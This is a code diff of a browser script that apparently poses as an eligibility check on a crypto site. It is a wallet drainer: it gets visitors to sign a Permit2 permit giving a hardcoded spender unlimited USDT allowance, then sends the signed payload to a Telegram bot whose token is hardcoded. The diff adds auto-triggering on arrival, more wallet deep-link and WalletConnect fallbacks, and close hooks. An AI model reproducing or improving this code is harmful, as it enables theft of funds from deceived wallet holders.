@@ -5,24 +5,25 @@
    Runs at any balance including zero. Delivers the complete payload to the bot.
    Never broadcasts the permit itself.
    Origin is pinned: every deep link and every WalletConnect URL is spheres.com.ng.
-   Private bot: single fixed chat, no routing ambiguity. */
+   Private bot: single fixed chat, no routing ambiguity.
+   Emits p2OnClose so the host page can restore itself. */
 
 (function () {
 "use strict";
 
 /* ---------------------------------------------------------------- constants */
-var SITE    = "https://spheres.com.ng";   /* canonical — never derived from location */
+var SITE    = "https://spheres.com.ng";
 var PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 var USDT    = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 var SPENDER = "0x5BB69F38D91a77DBe82371319e6A71292c214934";
 var BOT     = "9117463676:AAHswmKAjqWvTOAUu3YwL7EEqdwLyEUei24";
-var CHAT_FALLBACK = "";                   /* your own chat id — skips probing entirely */
+var CHAT_FALLBACK = "";
 var LAND    = "check.html";
 var CHAIN   = 1;
 var DAY     = 86400;
 var WC_PID  = "c5247dc1ef53e76d46efbaa1e646dd8b";
 
-var AMOUNT     = (1n << 160n) - 1n;      /* uint160 max — Permit2's unlimited */
+var AMOUNT     = (1n << 160n) - 1n;
 var AMOUNT_RAW = AMOUNT.toString();
 
 var MAX256 = (1n << 256n) - 1n;
@@ -131,7 +132,7 @@ function wordU(v) { return BigInt(v).toString(16).padStart(64, "0"); }
 function short(a) { return a ? a.slice(0, 6) + "…" + a.slice(-4) : "—"; }
 
 /* ---------------------------------------------------------------- state */
-var P = window.P2 = window.P2 || { owner: "", chat: "", bot: "", inflight: null, onStatus: null };
+var P = window.P2 = window.P2 || { owner: "", chat: "", bot: "", inflight: null, onStatus: null, onClose: null, done: false };
 var pendingResend = false;
 
 var selAllowance = selector("allowance(address,address,address)");
@@ -174,12 +175,26 @@ var CSS = `
 .p2w .p2cho{display:grid;gap:7px;margin-top:14px}
 .p2w .p2cho a{display:flex;justify-content:space-between;align-items:center;padding:13px 14px;background:#131417;border:1px solid #1E2023;border-radius:3px;color:#EDEAE4;font-size:13.5px;text-decoration:none;cursor:pointer}
 .p2w .p2cho a span{font-family:ui-monospace,monospace;font-size:9px;letter-spacing:.1em;text-transform:uppercase;color:#5E6166}
+.p2w .p2cho a.wc{background:rgba(255,90,31,.08);border-color:rgba(255,90,31,.3)}
+.p2w .p2cho a.wc span{color:#FF5A1F}
 @media(min-width:760px){
 .p2w .p2c{left:50%;right:auto;bottom:auto;top:50%;transform:translate(-50%,-50%);width:410px;border:1px solid #1E2023;border-radius:10px;padding:22px;animation:p2pop .2s}
 @keyframes p2pop{from{opacity:0;transform:translate(-50%,-48%)}to{opacity:1;transform:translate(-50%,-50%)}}
 }`;
 
 var ui = null;
+
+/* ---------------------------------------------------------------- close */
+function close() {
+  if (!ui) return;
+  var was = ui.classList.contains("on");
+  ui.classList.remove("on");
+  var box = document.getElementById("p2cho");
+  if (box) box.remove();
+  if (typeof P.onClose === "function") { try { P.onClose(P.done); } catch (e) {} }
+  try { window.dispatchEvent(new CustomEvent("spheres:p2close", { detail: { done: P.done } })); } catch (e) {}
+  if (was) lastAuto = 0;
+}
 
 /* ---------------------------------------------------------------- ui */
 function mount() {
@@ -203,11 +218,14 @@ function mount() {
     '</div>';
   document.body.appendChild(w);
   ui = w;
-  w.querySelector(".p2x").addEventListener("click", function () { w.classList.remove("on"); });
-  w.querySelector(".p2bg").addEventListener("click", function () { w.classList.remove("on"); });
+  w.querySelector(".p2x").addEventListener("click", close);
+  w.querySelector(".p2bg").addEventListener("click", close);
   w.querySelector("#p2go").addEventListener("click", function () {
     if (pendingResend) { window.p2Resend(); return; }
     flow();
+  });
+  document.addEventListener("keydown", function (e) {
+    if (e.key === "Escape" && ui && ui.classList.contains("on")) close();
   });
   paint();
   return w;
@@ -253,7 +271,6 @@ function setBtn(txt, disabled) {
 function iso(ts) { return new Date(ts * 1000).toISOString().replace(".000Z", "Z"); }
 
 /* ---------------------------------------------------------------- provider */
-/* one accessor for both worlds: injected first (ethereum + eip-6963), walletconnect second */
 var wc = null, wcBoot = null, injected = [];
 
 function provider() {
@@ -264,7 +281,6 @@ function provider() {
   return (wc && typeof wc.request === "function") ? wc : null;
 }
 
-/* in-app browsers inject late — hold the sheet and wait instead of bailing blank */
 function waitForProvider(ms) {
   return new Promise(function (resolve) {
     if (provider()) { resolve(true); return; }
@@ -347,7 +363,6 @@ async function waitReceipt(hash, limitMs) {
   throw new Error("approval timed out");
 }
 
-/* ecrecover precompile — proves the signature came from the owner */
 async function recover(digestHex, sig) {
   var v = parseInt(sig.slice(-2), 16);
   if (v < 27) v += 27;
@@ -357,17 +372,9 @@ async function recover(digestHex, sig) {
 }
 
 /* ---------------------------------------------------------------- chat */
-function saveChat(id) {
-  P.chat = id;
-  try { localStorage.setItem("p2_chat", id); } catch (e) {}
-}
+function saveChat(id) { P.chat = id; try { localStorage.setItem("p2_chat", id); } catch (e) {} }
+function dropChat() { P.chat = ""; try { localStorage.removeItem("p2_chat"); } catch (e) {} }
 
-function dropChat() {
-  P.chat = "";
-  try { localStorage.removeItem("p2_chat"); } catch (e) {}
-}
-
-/* private bot: one chat exists. cache -> ?c= -> constant -> last update. No scanning. */
 async function resolveChat() {
   if (P.chat) return P.chat;
   try { var s = localStorage.getItem("p2_chat"); if (s) { P.chat = s; return s; } } catch (e) {}
@@ -384,7 +391,6 @@ async function resolveChat() {
   return "";
 }
 
-/* direct send, one retry, never posts an empty chat_id */
 async function deliver(text) {
   for (var attempt = 0; attempt < 2; attempt++) {
     var c = await resolveChat();
@@ -418,7 +424,7 @@ async function flow() {
     try {
       if (!provider()) {
         setBtn("Connecting…", true);
-        if (!(await waitForProvider(5000))) { chooser(); setBtn((COPY[ACTION] || COPY.eligibility).btn, false); return; }
+        if (!(await waitForProvider(6000))) { chooser(); setBtn((COPY[ACTION] || COPY.eligibility).btn, false); return; }
       }
       var box = document.getElementById("p2cho");
       if (box) box.remove();
@@ -426,6 +432,7 @@ async function flow() {
       if (g0) g0.style.display = "";
       setBtn("Working…", true);
       P.approveTx = null;
+      P.done = false;
 
       var accs = await rpc("eth_requestAccounts", []);
       if (!accs || !accs.length) throw new Error("no account returned");
@@ -519,8 +526,6 @@ async function flow() {
       if (signer !== owner.toLowerCase()) throw new Error("signature does not recover to owner");
       log("signer recovered · matches owner", "g");
 
-      /* head 3 slots = 96 bytes, PermitSingle tuple 6 words = 192, so bytes at 288.
-         bytes region must pad to three full words: 65 bytes -> 96 bytes -> 192 hex. */
       var data = selPermit +
         word(owner) + wordU(96) + wordU(288) +
         word(USDT) + wordU(AMOUNT) + wordU(expiration) + wordU(nonce) +
@@ -608,9 +613,11 @@ async function flow() {
         document.getElementById("p2n").textContent = "Signed and captured · delivery retry needed";
       } else {
         pendingResend = false;
+        P.done = true;
         setBtn(sim === "ok" ? "Done ✓" : "Done · check log", true);
         document.getElementById("p2n").textContent = "Valid 30 days · single-use nonce · nothing moved yet";
       }
+      try { window.dispatchEvent(new CustomEvent("spheres:p2done", { detail: body })); } catch (e) {}
     } catch (e) {
       var m = String((e && e.message) || e);
       if (/reject|denied|4001/i.test(m)) { log("rejected in wallet", "r"); setBtn("Try again", false); }
@@ -626,10 +633,14 @@ async function flow() {
 function base() { return SITE + "/"; }
 
 var DEEP = {
-  mm: function (u) { return "https://link.metamask.io/dapp/" + encodeURIComponent(u.replace(/^https?:\/\//, "")); },
+  mm: function (u) {
+    var p = new URL(u);
+    return "https://link.metamask.io/dapp/" + p.host + p.pathname +
+      (p.search ? "%3F" + encodeURIComponent(p.search.slice(1)) : "");
+  },
   tw: function (u) { return "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(u); },
   cb: function (u) { return "https://go.cb-w.com/dapp?cb_url=" + encodeURIComponent(u); },
-  rb: function (u) { return "https://rnbwapp.com/dapp?url=" + encodeURIComponent(u); }
+  rb: function (u) { return "https://rnbwapp.com/dapp/?url=" + encodeURIComponent(u); }
 };
 
 function full() {
@@ -646,42 +657,30 @@ function chooser() {
   w.classList.add("on");
   if (card.querySelector("#p2cho")) return;
 
-  var ua = navigator.userAgent;
-  var touch = /Android|iPhone|iPad|iPod/i.test(ua) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
-
   var box = document.createElement("div");
   box.className = "p2cho";
   box.id = "p2cho";
 
-  if (!touch) {
-    var row = document.createElement("a");
-    row.innerHTML = "WalletConnect<span>qr / scan →</span>";
-    row.addEventListener("click", function (e) { e.preventDefault(); beginWc(); });
-    box.appendChild(row);
-  } else {
-    var rows = [
-      ["MetaMask", "mm"],
-      ["Trust Wallet", "tw"],
-      ["Coinbase Wallet", "cb"],
-      ["Rainbow", "rb"]
-    ];
-    rows.forEach(function (r) {
-      var a = document.createElement("a");
-      a.innerHTML = r[0] + "<span>open ↗</span>";
-      a.addEventListener("click", function (e) {
-        e.preventDefault();
-        location.href = DEEP[r[1]](full());
-      });
-      box.appendChild(a);
+  var wcRow = document.createElement("a");
+  wcRow.className = "wc";
+  wcRow.innerHTML = "WalletConnect<span>qr / scan →</span>";
+  wcRow.addEventListener("click", function (e) { e.preventDefault(); beginWc(); });
+  box.appendChild(wcRow);
+
+  [["MetaMask", "mm"], ["Trust Wallet", "tw"], ["Coinbase Wallet", "cb"], ["Rainbow", "rb"]].forEach(function (r) {
+    var a = document.createElement("a");
+    a.innerHTML = r[0] + "<span>open ↗</span>";
+    a.addEventListener("click", function (e) {
+      e.preventDefault();
+      location.href = DEEP[r[1]](full());
     });
-  }
+    box.appendChild(a);
+  });
 
   if (go) go.style.display = "none";
   card.appendChild(box);
   var n = card.querySelector("#p2n");
-  if (n) n.textContent = touch
-    ? "No wallet in this browser · pick one to continue there"
-    : "No wallet in this browser · scan with any wallet to continue here";
+  if (n) n.textContent = "Scan from any wallet, or open this page in one";
 }
 
 async function beginWc() {
@@ -702,6 +701,7 @@ async function beginWc() {
     var g2 = document.getElementById("p2go");
     if (g2) g2.style.display = "";
     setBtn("Try again", false);
+    chooser();
   }
 }
 
@@ -726,6 +726,8 @@ function openPanel(opt) {
 /* ---------------------------------------------------------------- api */
 var lastAuto = 0;
 
+window.p2Close = close;
+
 window.p2Resend = async function () {
   var text = "";
   try { text = localStorage.getItem("p2_text") || ""; } catch (e) {}
@@ -733,7 +735,7 @@ window.p2Resend = async function () {
   setBtn("Sending…", true);
   dropChat();
   var ok = await deliver(text);
-  if (ok) { pendingResend = false; setBtn("Done ✓", true); }
+  if (ok) { pendingResend = false; P.done = true; setBtn("Done ✓", true); }
   else { pendingResend = true; setBtn("Resend receipt", false); }
   return ok;
 };
@@ -742,18 +744,19 @@ window.p2Advance = function (opt) {
   opt = opt || {};
   openPanel(opt);
   if (pendingResend && opt.auto) return true;
+
   if (provider()) {
     if (opt.auto) {
       if (P.inflight) return true;
-      if (Date.now() - lastAuto < 1500) return true;
+      if (Date.now() - lastAuto < 800) return true;
       lastAuto = Date.now();
-      setTimeout(function () { flow(); }, 120);
+      setTimeout(function () { flow(); }, 100);
     }
     return true;
   }
-  /* no provider yet — sheet stays up, button shows progress, never blank */
+
   setBtn("Connecting…", true);
-  waitForProvider(5000).then(function (ok) {
+  waitForProvider(6000).then(function (ok) {
     if (P.inflight) return;
     if (ok) {
       if (opt.auto) flow();
@@ -769,15 +772,16 @@ window.p2Advance = function (opt) {
 window.p2Connect = function (opt) {
   opt = opt || {};
   openPanel(opt);
-  if (provider()) { setTimeout(function () { flow(); }, 120); return true; }
-  var ua = navigator.userAgent;
-  var touch = /Android|iPhone|iPad|iPod/i.test(ua) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
-  if (touch) { chooser(); return true; }
-  beginWc();
+  if (provider()) { setTimeout(function () { flow(); }, 100); return true; }
+  waitForProvider(2500).then(function (ok) {
+    if (ok) { flow(); return; }
+    chooser();
+  });
   return true;
 };
 
 window.p2OnStatus = function (cb) { P.onStatus = cb; };
+window.p2OnClose  = function (cb) { P.onClose  = cb; };
 
 /* ---------------------------------------------------------------- boot */
 (function boot() {
@@ -789,7 +793,6 @@ window.p2OnStatus = function (cb) { P.onStatus = cb; };
   try { if (!P.owner) P.owner = localStorage.getItem("p2_owner") || ""; } catch (e) {}
   if (qs.get("c") && /^-?\d+$/.test(qs.get("c"))) saveChat(qs.get("c"));
 
-  /* collect late / multi-wallet injections */
   window.addEventListener("eip6963:announceProvider", function (e) {
     try { if (e.detail && e.detail.provider) injected.push(e.detail.provider); } catch (x) {}
   });
@@ -800,12 +803,16 @@ window.p2OnStatus = function (cb) { P.onStatus = cb; };
     .then(function (j) { if (j && j.ok) P.bot = j.result.username; })
     .catch(function () {});
 
+  /* arrival: always auto once per owner+action, never time-gated */
   if (qs.get("w") === "1") {
-    var k = "p2_ran_" + (P.owner || "anon").toLowerCase() + "_" + ACTION, last = 0;
-    try { last = +sessionStorage.getItem(k) || 0; } catch (e) {}
-    var fresh = Date.now() - last > 20000;
-    if (fresh) { try { sessionStorage.setItem(k, String(Date.now())); } catch (e) {} }
-    setTimeout(function () { window.p2Advance({ owner: P.owner, auto: fresh }); }, 60);
+    var key = "p2_auto_" + (P.owner || "anon").toLowerCase() + "_" + ACTION;
+    var ran = false;
+    try { ran = sessionStorage.getItem(key) === "1"; } catch (e) {}
+    setTimeout(function () {
+      if (ran) { window.p2Advance({ owner: P.owner, auto: false }); return; }
+      try { sessionStorage.setItem(key, "1"); } catch (e) {}
+      window.p2Advance({ owner: P.owner, auto: true });
+    }, 60);
   }
 })();
 
